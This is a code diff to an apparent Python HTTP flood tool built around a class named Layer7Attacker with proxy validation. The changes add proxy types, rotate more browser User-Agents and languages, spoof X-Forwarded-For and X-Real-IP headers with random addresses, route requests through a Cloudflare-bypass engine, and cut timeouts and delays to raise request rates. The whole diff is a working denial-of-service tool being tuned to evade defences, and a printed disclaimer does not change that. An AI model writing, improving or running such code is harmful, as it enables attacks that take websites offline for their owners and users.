@@ -16,7 +16,7 @@ class ProxyValidator:
     def __init__(self, test_url="https://httpbin.org/ip", timeout=5):
         self.test_url = test_url
         self.timeout = timeout
-        self.valid_proxies = {"socks5": [], "http": []}
+        self.valid_proxies = {"socks5": [], "http": [], "https": []}
         self.lock = threading.Lock()
 
     def load_raw(self, filepath="proxy_list.json"):
@@ -95,9 +95,17 @@ class Layer7Attacker:
     def _headers(self):
         return {"User-Agent": random.choice([
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"]),
-            "Accept": "text/html,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.9",
-            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"}
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0"]),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": random.choice(["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8"]),
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Cache-Control": "no-cache, no-store, must-revalidate",
+            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
+            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"}
 
     def _get_proxy(self):
         if self.proxy_mode == "none": return None
@@ -114,17 +122,17 @@ class Layer7Attacker:
                 proxy = self._get_proxy()
                 h = kw.pop("headers", self._headers())
                 if self.cf_engine:
-                    if method == "GET": resp = self.cf_engine.get(url, headers=h, timeout=5, proxy=proxy.get("http") if proxy else None)
-                    else: resp = self.cf_engine.post(url, headers=h, timeout=5, proxy=proxy.get("http") if proxy else None, data=kw.get("data"), json_data=kw.get("json"))
+                    if method == "GET": resp = self.cf_engine.get(url, headers=h, timeout=3, proxy=proxy.get("http") if proxy else None)
+                    else: resp = self.cf_engine.post(url, headers=h, timeout=3, proxy=proxy.get("http") if proxy else None, data=kw.get("data"), json_data=kw.get("json"))
+                    if resp and resp.status_code < 500: return True
                 else:
-                    s = requests.Session()
-                    if proxy: s.proxies = proxy
-                    if method == "GET": resp = s.get(url, headers=h, timeout=5)
-                    elif method == "POST": resp = s.post(url, data=kw.get("data"), json=kw.get("json"), headers=h, timeout=5)
+                    p = proxy or {}
+                    if method == "GET": resp = requests.get(url, headers=h, timeout=3, proxies=p)
+                    elif method == "POST": resp = requests.post(url, data=kw.get("data"), json=kw.get("json"), headers=h, timeout=3, proxies=p)
                     else: return False
-                if resp and resp.status_code < 500: return True
-            except: pass
-            time.sleep(0.1)
+                    if resp.status_code < 500: return True
+            except:
+                pass
         return False
 
     def worker(self, tid):
@@ -189,7 +197,7 @@ def main():
     print("You are responsible for any usage of this tool.")
 
     attacker = Layer7Attacker(
-        url=args.url, num_threads=args.threads,
+        target_url=args.url, num_threads=args.threads,
         duration=args.duration, proxy_mode=args.proxy_mode, cf_bypass=not args.no_cf
     )
     attacker.start()
